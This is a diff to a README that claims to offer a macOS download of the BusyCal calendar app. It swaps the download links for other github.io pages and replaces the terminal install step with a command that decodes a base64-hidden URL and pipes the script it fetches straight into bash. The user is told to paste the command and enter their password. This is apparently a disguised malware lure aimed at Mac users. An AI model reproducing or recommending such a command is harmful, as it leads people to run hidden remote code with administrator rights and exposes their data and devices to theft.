@@ -7,7 +7,7 @@ Whether you're managing work projects, planning personal events, or juggling mul
 ---
 
 ## ✅ Download BusyCal for macOS  
-[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://voiceink-download-mac.github.io/.github)
+[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://shuziktobehuman.github.io/huja/BusyCal)
 
 ---
 
@@ -26,7 +26,7 @@ Installation via a command in the terminal:
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 
 
@@ -62,7 +62,7 @@ With support for customizable calendar views, task integration, weather, tags, a
 
 ---
 
-[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://voiceink-download-mac.github.io/.github)
+[![Download BusyCal](https://img.shields.io/badge/Download-BusyCal-blueviolet)](https://shuziktobehuman.github.io/huja/BusyCal)
 
 
 ---
